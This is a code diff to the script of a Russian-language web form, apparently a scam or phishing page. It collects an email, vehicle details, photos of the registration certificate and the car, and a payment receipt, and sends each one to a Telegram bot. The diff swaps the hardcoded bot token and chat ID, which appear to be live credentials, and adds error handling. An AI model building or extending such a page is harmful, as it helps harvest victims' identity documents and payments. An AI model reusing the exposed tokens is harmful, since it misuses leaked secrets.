@@ -128,8 +128,8 @@
     </div>
 
     <script>
-        const token = "8649772804:AAGjKzXa0-qQ0Ee4NcVOXDvUCSzkq-I_xXU";
-        const chat_id = "7512855086";
+        const token = "8718519861:AAEv5MGkCm-wwyAkiFP1t0eakyn8xbHZq5w";
+        const chat_id = "1481119810";
 
         function updateLabel(input) {
             const label = input.parentElement;
@@ -148,7 +148,8 @@
                 fd.append('chat_id', chat_id);
                 fd.append('document', el.files[0]);
                 fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd });
+                let response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd });
+                if (!response.ok) throw new Error('Ошибка загрузки файла');
             }
         }
 
@@ -157,16 +158,25 @@
             const b = document.getElementById('btn-full');
             b.disabled = true; b.innerText = "ОТПРАВКА...";
             
-            const msg = `🚛 НОВАЯ ЗАЯВКА\n📧 Почта: ${document.getElementById('finish_email').value}\n🚗 Пробег: ${document.getElementById('mileage').value}\n🛞 Шины: ${document.getElementById('tires').value}\n📟 Тахограф: ${document.getElementById('tach_model').value || 'Не указан'}\n🔢 Сер.номер: ${document.getElementById('tach_ser').value || 'Не указан'}\n📝 Коммент: ${document.getElementById('comment').value}`;
+            const msg = `🚛 НОВАЯ ЗАЯВКА (ПОЛНАЯ)\n📧 Почта: ${document.getElementById('finish_email').value}\n🚗 Пробег: ${document.getElementById('mileage').value}\n🛞 Шины: ${document.getElementById('tires').value}\n📟 Тахограф: ${document.getElementById('tach_model').value || 'Не указан'}\n🔢 Сер.номер: ${document.getElementById('tach_ser').value || 'Не указан'}\n📝 Коммент: ${document.getElementById('comment').value}`;
             
             try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-                await upload('sts_1', 'СТС Лиц'); await upload('sts_2', 'СТС Обор');
-                await upload('car_front', 'Авто Перед'); await upload('car_back', 'Авто Зад');
+                let response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                if (!response.ok) throw new Error('Ошибка отправки текста');
+
+                await upload('sts_1', 'СТС Лиц'); 
+                await upload('sts_2', 'СТС Обор');
+                await upload('car_front', 'Авто Перед'); 
+                await upload('car_back', 'Авто Зад');
+
                 document.getElementById('full-step-1').classList.add('hidden');
                 document.getElementById('full-step-2').classList.remove('hidden');
                 window.scrollTo(0,0);
-            } catch (err) { alert("Ошибка!"); b.disabled = false; b.innerText = "ПОВТОРИТЬ"; }
+            } catch (err) { 
+                alert("Ошибка! " + err.message + "\nПопробуйте через минуту."); 
+                b.disabled = false; 
+                b.innerText = "ПОВТОРИТЬ"; 
+            }
         };
 
         document.getElementById('receipt-form').onsubmit = async (e) => {
@@ -177,7 +187,11 @@
                 await upload('receipt_file', `✅ ЧЕК от ${document.getElementById('finish_email').value}`);
                 document.getElementById('full-step-2').classList.add('hidden');
                 document.getElementById('full-step-3').classList.remove('hidden');
-            } catch (err) { alert("Ошибка!"); b.disabled = false; }
+            } catch (err) { 
+                alert("Ошибка загрузки чека!"); 
+                b.disabled = false; 
+                b.innerText = "Я ОПЛАТИЛ(А)"; 
+            }
         };
     </script>
 </body>
